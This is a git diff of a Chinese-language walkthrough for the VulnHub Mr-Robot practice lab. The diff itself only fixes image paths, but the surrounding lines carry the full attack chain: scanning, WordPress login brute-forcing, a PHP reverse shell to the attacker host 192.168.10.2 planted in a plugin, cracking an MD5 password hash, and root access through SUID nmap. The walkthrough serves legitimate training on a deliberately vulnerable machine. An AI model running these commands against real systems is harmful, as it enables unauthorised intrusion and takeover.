@@ -18,7 +18,7 @@
 
 也可以使用`nmap`等工具进行
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\1.jpg)
+![](./pic/1.jpg)
 
 
 
@@ -30,7 +30,7 @@
 nmap -sV -O 192.168.10.11 -p-
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\2.jpg)
+![](./pic/2.jpg)
 
 注意，这里的`SSH`扫描出的是处于关闭状态
 
@@ -40,13 +40,13 @@ nmap -sV -O 192.168.10.11 -p-
 
 而且对于`443`端口的访问与之一样的
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\3.jpg)
+![](./pic/3.jpg)
 
 哇塞，这个界面有东西的，输入对应的命令，其实是进入到对应的网站目录，不过对于每一个页面，是以图片展示的，访问`prepare`，在浏览器的`url`中添加目录，无论添加哪一个都是这种页面
 
 应该是`wordpress`的，点击下方的`login`，以及`wappalyzer`插件的解析，确定为`wordpress`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\4.jpg)
+![](./pic/4.jpg)
 
 ### prepare
 
@@ -54,7 +54,7 @@ nmap -sV -O 192.168.10.11 -p-
 
 这是一个视频，其中介绍到，它们是`fsociety`，放到最后会有一个域名`whoismrrobot.com`，为了截图，我放了两遍
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\5.jpg)
+![](./pic/5.jpg)
 
 在界面终端继续输入`fsociety`，这个视频只有`are you ready to join fsociety?`，就不截图了
 
@@ -64,19 +64,19 @@ nmap -sV -O 192.168.10.11 -p-
 
 这是第一张图片
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\6.jpg)
+![](./pic/6.jpg)
 
 第二张
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\7.jpg)
+![](./pic/7.jpg)
 
 第三张
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\8.jpg)
+![](./pic/8.jpg)
 
 第四张
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\9.jpg)
+![](./pic/9.jpg)
 
 ### question
 
@@ -84,19 +84,19 @@ nmap -sV -O 192.168.10.11 -p-
 
 第一张
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\10.jpg)
+![](./pic/10.jpg)
 
 第二张
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\11.jpg)
+![](./pic/11.jpg)
 
 第三张
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\12.jpg)
+![](./pic/12.jpg)
 
 第四张
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\13.jpg)
+![](./pic/13.jpg)
 
 
 
@@ -104,7 +104,7 @@ nmap -sV -O 192.168.10.11 -p-
 
 访问`join`，给出的话，就是给一个邮箱，假如到`fsociety`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\14.jpg)
+![](./pic/14.jpg)
 
 ## 网站目录爆破
 
@@ -114,15 +114,15 @@ nmap -sV -O 192.168.10.11 -p-
 dirsearch -u http://192.168.10.12 -x 403,404 -e zip,gz
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\15.jpg)
+![](./pic/15.jpg)
 
 访问`readme`，发现一段话，应该是提示，反正就是他不会帮助
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\16.jpg)
+![](./pic/16.jpg)
 
 再次访问`robots.txt`发现两个文件
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\17.jpg)
+![](./pic/17.jpg)
 
 访问`fsocity.dic`，发现应该是一个字典，使用`curl`把内容下载下来，直接访问，因为太大，导致卡顿
 
@@ -130,11 +130,11 @@ dirsearch -u http://192.168.10.12 -x 403,404 -e zip,gz
 curl http://192.168.10.12/fsocity.dic > dic
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\18.jpg)
+![](./pic/18.jpg)
 
 再访问另一个文件`key-1-of-3.txt`，根据文件名，这应该是第一个`key`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\19.jpg)
+![](./pic/19.jpg)
 
 之前就确定有`wordpress`，这里经过扫描，发现`wp-login`等其特具有的目录后，更加确定
 
@@ -148,7 +148,7 @@ curl http://192.168.10.12/fsocity.dic > dic
 wpscan --url http://192.168.10.12
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\20.jpg)
+![](./pic/20.jpg)
 
 但是尝试枚举用户，发现没有一个用户被枚举出
 
@@ -158,35 +158,35 @@ wpscan --url http://192.168.10.12
 
 在登录界面，输入不存在的一个用户，发现，这里的提示是明确指出用户名不存在的
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\21.jpg)
+![](./pic/21.jpg)
 
 那么进行爆破测试，在`burp`抓取数据包，发送到`intruder`模块
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\22.jpg)
+![](./pic/22.jpg)
 
 再设置一个过滤条件，虽然`burp`有一个功能是可以直接进行过滤的，不过那是在专业版才有的功能，在某些考试是只能使用社区版的，所以，这里尽量不使用那个功能
 
 这里的设置是在社区版也是可用的
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\23.jpg)
+![](./pic/23.jpg)
 
 然后开始爆破，注意观察设置的过滤，发现一个用户提示不一样`elliot`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\24.jpg)
+![](./pic/24.jpg)
 
 这里提示是用户`Elliot`的密码错误，啧，突然想到这里对于暴力破解是没有做任何限制的，这就考察基本的思路点，对于现实碰到的条件限制，进一步思索，这里有爆破的思路即可
 
 那么再次使用这个数据包，对用户`Elliot`的密码再破解，这里我依然建议使用`burp`，不过把资源池调高一点，也就是线程调高
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\25.jpg)
+![](./pic/25.jpg)
 
 依然设置过滤，不过这里需要刷新一下，重新获取新的响应包
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\26.jpg)
+![](./pic/26.jpg)
 
 这里需要时间，要等等，查看网上`wp`，确定密码为`ER28-0652`，检测字典文件，发现在最后，这字典太大了，以我电脑配置，这时间太长，所以我把位置调整了一下
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\27.jpg)
+![](./pic/27.jpg)
 
 这里也可以使用`wpscan`进行测试，可能也会比`burp`快吧，因为同样的位置，我电脑配置来说，`wpscan`更快
 
@@ -194,7 +194,7 @@ wpscan --url http://192.168.10.12
 wpscan --url http://192.168.10.12 -U Elliot Elliot -P dic -t 50
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\42.jpg)
+![](./pic/42.jpg)
 
 
 
@@ -204,11 +204,11 @@ wpscan --url http://192.168.10.12 -U Elliot Elliot -P dic -t 50
 
 成功进入后台，那么先看插件吧，毕竟对于`wordpress`插件漏洞很多
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\28.jpg)
+![](./pic/28.jpg)
 
 在下面发现`hello dolly`，直接把它激活，然后进入编辑界面，测试能否编辑，发现可以，那么可以自己编写反弹`shell`，或者利用`kali`中带有的反弹`shell`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\29.jpg)
+![](./pic/29.jpg)
 
 先更改以下代码进行测试，若不行，再更换，触发反弹`shell`，当然还是需要先在`kali`开启监听的
 
@@ -218,7 +218,7 @@ system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.10.2/9999 0>&1'");
 ?>
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\30.jpg)
+![](./pic/30.jpg)
 
 # 提权
 
@@ -228,15 +228,15 @@ system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.10.2/9999 0>&1'");
 
 数据库类型是`mysql`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\31.jpg)
+![](./pic/31.jpg)
 
 并且当前目录下，有一个文件名，叫做，你永远猜不到的文件名
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\32.jpg)
+![](./pic/32.jpg)
 
 查看靶机内的用户，发现只有`robot`在`/home`下有目录，不过查看`/etc/passwd`并没有指定`bash`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\33.jpg)
+![](./pic/33.jpg)
 
 切换到`/home/robot`下，发现有密码文件，具有查看权限，查看发现是`md5`加密
 
@@ -244,17 +244,17 @@ system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.10.2/9999 0>&1'");
 robot:c3fcd3d76192e4007dfb496cca67e13b
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\34.jpg)
+![](./pic/34.jpg)
 
 可通过在线网站`somd5.com`解密，或者通过`john`破解也是可以，不过爆破时间感觉会很长的
 
 最后解密为`abcdefghijklmnopqrstuvwxyz`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\35.jpg)
+![](./pic/35.jpg)
 
 提权到`robot`成功，并且获得第二个`key`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\36.jpg)
+![](./pic/36.jpg)
 
 ## 提权至root
 
@@ -265,20 +265,20 @@ find / -perm -4000 -print 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\37.jpg)
+![](./pic/37.jpg)
 
 不过这里发现一个`nmap`具有SUID权限，可查看网站`gtfobins.github.io`查看用法
 
 不过这里是进行文件写入的，这里因为是具有SUID权限，所以对于`sudo`提权也可以进行测试的
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\38.jpg)
+![](./pic/38.jpg)
 
 ```shell
 LFILE=/tmp/1
 /usr/local/bin/nmap -oG=$LFILE test
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\39.jpg)
+![](./pic/39.jpg)
 
 ```shell
 TF=$(mktemp)
@@ -288,14 +288,14 @@ echo 'os.execute("/bin/sh")' > $TF
 
 最终测试，下面这个可行，为什么呢，因为版本在可利用的范围内
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\40.jpg)
+![](./pic/40.jpg)
 
 ```shell
 /usr/local/bin/nmap --interactive
 nmap> !sh
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\mr-Robot靶场\pic\41.jpg)
+![](./pic/41.jpg)
 
 # 总结
 
